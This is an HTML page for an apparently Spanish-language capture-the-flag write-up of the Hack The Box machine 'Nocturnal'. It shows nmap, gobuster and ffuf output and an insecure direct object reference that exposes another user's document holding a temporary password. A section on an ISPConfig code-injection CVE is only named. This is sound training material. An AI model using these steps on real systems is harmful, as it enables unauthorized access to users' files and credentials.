@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Nocturnal | Cybersecurity Borhub Home</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+Reconocimiento
+​❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST
+Initiating SYN Stealth Scan at 21:38
+Scanning 10.10.11.64 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.64
+Discovered open port 22/tcp on 10.10.11.64
+Discovered open port 80/tcp on 10.10.11.64
+Discovered open port 22/tcp on 10.10.11.64
+Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.64
+Host is up, received user-set (0.047s latency).
+Scanned at 2025-04-16 21:38:54 CEST for 14s
+Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
+           Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados:
+  ➜  22
+  ➜  80
+
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted
+[sudo] contraseña para borhub:
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST
+Nmap scan report for nocturnal.htb (10.10.11.64)
+Host is up (0.14s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
+|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
+|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Welcome to Nocturnal
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
+Enumeración web
+❯ whatweb nocturnal.htb
+http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
+❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[&#43;] Url:                     http://nocturnal.htb
+[&#43;] Method:                  GET
+[&#43;] Threads:                 200
+[&#43;] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[&#43;] Negative Status codes:   404
+[&#43;] User Agent:              gobuster/3.6
+[&#43;] Follow Redirect:         true
+[&#43;] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 403) [Size: 162]
+/backups              (Status: 403) [Size: 162]
+/uploads2             (Status: 403) [Size: 162]
+Progress: 220559 / 220560 (100.00%)
+===============================================================
+Finished
+===============================================================
+En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.">
+<meta name="author" content="">
+<link rel="canonical" href="https://borhuub.github.io/write-ups/linux/easy/nocturnal/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3f7c354717d256c925885357f6e3db263366c69483a88a7f441fa396c90d7330.css" integrity="sha256-P3w1RxfSVskliFNX9uPbJjNmxpSDqIp/RB&#43;jlskNczA=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://borhuub.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/write-ups/linux/easy/nocturnal/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://borhuub.github.io/write-ups/linux/easy/nocturnal/">
+  <meta property="og:site_name" content="Cybersecurity Borhub Home">
+  <meta property="og:title" content="Nocturnal">
+  <meta property="og:description" content="
+Reconocimiento ​❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST Initiating SYN Stealth Scan at 21:38 Scanning 10.10.11.64 [65535 ports] Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports) Nmap scan report for 10.10.11.64 Host is up, received user-set (0.047s latency). Scanned at 2025-04-16 21:38:54 CEST for 14s Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted [sudo] contraseña para borhub: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST Nmap scan report for nocturnal.htb (10.10.11.64) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA) | 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA) |_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Welcome to Nocturnal | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds Enumeración web ❯ whatweb nocturnal.htb http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] ❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [&#43;] Url: http://nocturnal.htb [&#43;] Method: GET [&#43;] Threads: 200 [&#43;] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [&#43;] Negative Status codes: 404 [&#43;] User Agent: gobuster/3.6 [&#43;] Follow Redirect: true [&#43;] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 403) [Size: 162] /backups (Status: 403) [Size: 162] /uploads2 (Status: 403) [Size: 162] Progress: 220559 / 220560 (100.00%) =============================================================== Finished =============================================================== En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="write-ups">
+    <meta property="article:published_time" content="2025-09-11T12:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-11T12:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Nocturnal">
+<meta name="twitter:description" content="
+Reconocimiento
+​❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST
+Initiating SYN Stealth Scan at 21:38
+Scanning 10.10.11.64 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.64
+Discovered open port 22/tcp on 10.10.11.64
+Discovered open port 80/tcp on 10.10.11.64
+Discovered open port 22/tcp on 10.10.11.64
+Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.64
+Host is up, received user-set (0.047s latency).
+Scanned at 2025-04-16 21:38:54 CEST for 14s
+Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
+           Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB)
+❯ ports.py ports
+
+🔍 Puertos encontrados:
+  ➜  22
+  ➜  80
+
+¡Puertos copiados en el portapapeles!
+❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted
+[sudo] contraseña para borhub:
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST
+Nmap scan report for nocturnal.htb (10.10.11.64)
+Host is up (0.14s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
+|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
+|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Welcome to Nocturnal
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds
+Enumeración web
+❯ whatweb nocturnal.htb
+http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
+❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[&#43;] Url:                     http://nocturnal.htb
+[&#43;] Method:                  GET
+[&#43;] Threads:                 200
+[&#43;] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[&#43;] Negative Status codes:   404
+[&#43;] User Agent:              gobuster/3.6
+[&#43;] Follow Redirect:         true
+[&#43;] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 403) [Size: 162]
+/backups              (Status: 403) [Size: 162]
+/uploads2             (Status: 403) [Size: 162]
+Progress: 220559 / 220560 (100.00%)
+===============================================================
+Finished
+===============================================================
+En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/write-ups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Linux",
+      "item": "https://borhuub.github.io/write-ups/linux/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Writeups Linux - Nivel Easy",
+      "item": "https://borhuub.github.io/write-ups/linux/easy/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "Nocturnal",
+      "item": "https://borhuub.github.io/write-ups/linux/easy/nocturnal/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Nocturnal",
+  "name": "Nocturnal",
+  "description": "\nReconocimiento ​❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST Initiating SYN Stealth Scan at 21:38 Scanning 10.10.11.64 [65535 ports] Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports) Nmap scan report for 10.10.11.64 Host is up, received user-set (0.047s latency). Scanned at 2025-04-16 21:38:54 CEST for 14s Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted [sudo] contraseña para borhub: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST Nmap scan report for nocturnal.htb (10.10.11.64) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA) | 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA) |_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Welcome to Nocturnal | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds Enumeración web ❯ whatweb nocturnal.htb http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] ❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://nocturnal.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 403) [Size: 162] /backups (Status: 403) [Size: 162] /uploads2 (Status: 403) [Size: 162] Progress: 220559 / 220560 (100.00%) =============================================================== Finished =============================================================== En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "\nReconocimiento ​❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:38 CEST Initiating SYN Stealth Scan at 21:38 Scanning 10.10.11.64 [65535 ports] Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Discovered open port 80/tcp on 10.10.11.64 Discovered open port 22/tcp on 10.10.11.64 Completed SYN Stealth Scan at 21:39, 13.97s elapsed (65535 total ports) Nmap scan report for 10.10.11.64 Host is up, received user-set (0.047s latency). Scanned at 2025-04-16 21:38:54 CEST for 14s Not shown: 65327 closed tcp ports (reset), 206 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds Raw packets sent: 78164 (3.439MB) | Rcvd: 69986 (2.800MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 22 ➜ 80 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p22,80 10.10.11.64 -oN trageted [sudo] contraseña para borhub: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 21:36 CEST Nmap scan report for nocturnal.htb (10.10.11.64) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA) | 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA) |_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Welcome to Nocturnal | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds Enumeración web ❯ whatweb nocturnal.htb http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] ❯ gobuster dir -u http://nocturnal.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://nocturnal.htb [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /uploads (Status: 403) [Size: 162] /backups (Status: 403) [Size: 162] /uploads2 (Status: 403) [Size: 162] Progress: 220559 / 220560 (100.00%) =============================================================== Finished =============================================================== En un principio vemos una página normal y corriente que tiene un panel de registro y otro de login. Por el momento vamos a crear una cuenta para ver el dashboard que nos muestra.\nUna vez subimos una archivo nos sale bajo del titulo Your files, y si hacemos hovering sobre el nos sale una ruta que parece que es para mostrar el archivo.\nEntonces provee a meterlo en la url del navegador para ver que mostraba los archivos que yo tengo guardados:\nAhora voy a intentar hacer un listado de usuarios con ffuf para ver si puedo hacer lo mismo que he hecho con mi usuario para acceder a información a la cual actualmente no tengo acceso.\nDurante el listado le aplico mi cookie para que me permita listar y filtro las palabras con un size de 2985 ya que me estaba devolviendo falsos positivos y con el filtro encontramos los siguientes usuarios:\n❯ ffuf -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt -u \"http://nocturnal.htb/view.php?username=FUZZ\u0026file=*.pdf\" -H \"Cookie: PHPSESSID=uru5g7j7mkf7ko2ttlaik57ttk\" -fs 2985 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0 ________________________________________________ :: Method : GET :: URL : http://nocturnal.htb/view.php?username=FUZZ\u0026file=*.pdf :: Wordlist : FUZZ: /usr/share/SecLists/Usernames/xato-net-10-million-usernames-dup.txt :: Header : Cookie: PHPSESSID=uru5g7j7mkf7ko2ttlaik57ttk :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 2985 ________________________________________________ admin [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 98ms] amanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 193ms] tobias [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 50ms] user [Status: 200, Size: 3181, Words: 1176, Lines: 129, Duration: 43ms] Enumero manualmente cada usuario encontrado para ver si puedo ver los archivos que contiene y en el usuario de amanda encuentro un archivo:\nUna vez descargado el .odt intento mostrar el archivo con cat pero es un binario entonces le listo el contenido y veo que tiene varios archivos dentro:\n❯ unzip -l privacy.odt Archive: privacy.odt Length Date Time Name --------- ---------- ----- ---- 39 2024-10-06 21:54 mimetype 0 2024-10-06 21:54 Configurations2/accelerator/ 0 2024-10-06 21:54 Configurations2/images/Bitmaps/ 0 2024-10-06 21:54 Configurations2/toolpanel/ 0 2024-10-06 21:54 Configurations2/floater/ 0 2024-10-06 21:54 Configurations2/statusbar/ 0 2024-10-06 21:54 Configurations2/toolbar/ 0 2024-10-06 21:54 Configurations2/progressbar/ 0 2024-10-06 21:54 Configurations2/popupmenu/ 0 2024-10-06 21:54 Configurations2/menubar/ 12346 2024-10-06 21:54 styles.xml 899 2024-10-06 21:54 manifest.rdf 4657 2024-10-06 21:54 content.xml 978 2024-10-06 21:54 meta.xml 13728 2024-10-06 21:54 settings.xml 11843 2024-10-06 21:54 Thumbnails/thumbnail.png 1061 2024-10-06 21:54 META-INF/manifest.xml --------- ------- 45551 17 files Enumerando los archivos rápidamente vemos un mensaje a amanda en el cual le proveen de una contraseña temporal la cual debería cambiar la proxima vez que inicie sessión.\n❯ cat content.xml ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: content.xml ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e 2 │ ",
+  "wordCount" : "2323",
+  "inLanguage": "en",
+  "datePublished": "2025-09-11T12:00:00Z",
+  "dateModified": "2025-09-11T12:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/write-ups/linux/easy/nocturnal/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Cybersecurity Borhub Home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Cybersecurity Borhub Home (Alt + H)">Cybersecurity Borhub Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/" title="Inicio">
+                    <span>Inicio</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/write-ups/" title="Write-Ups">
+                    <span>Write-Ups</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Nocturnal
+    </h1>
+    <div class="post-meta"><span title='2025-09-11 12:00:00 +0000 UTC'>September 11, 2025</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a></li>
+                <li>
+                    <a href="#acceso-inicial" aria-label="Acceso Inicial">Acceso Inicial</a></li>
+                <li>
+                    <a href="#escalada-de-privilegios" aria-label="Escalada de privilegios">Escalada de privilegios</a><ul>
+                        
+                <li>
+                    <a href="#cve-2023-46818---ispconfig-exploit---php-code-injection" aria-label="CVE-2023-46818 - ISPConfig Exploit - PHP Code Injection">CVE-2023-46818 - ISPConfig Exploit - PHP Code Injection</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="Nocturnal_Machine" loading="lazy" src="/write-ups/linux/easy/nocturnal/Fotos/nocturnal_machine.png"></p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
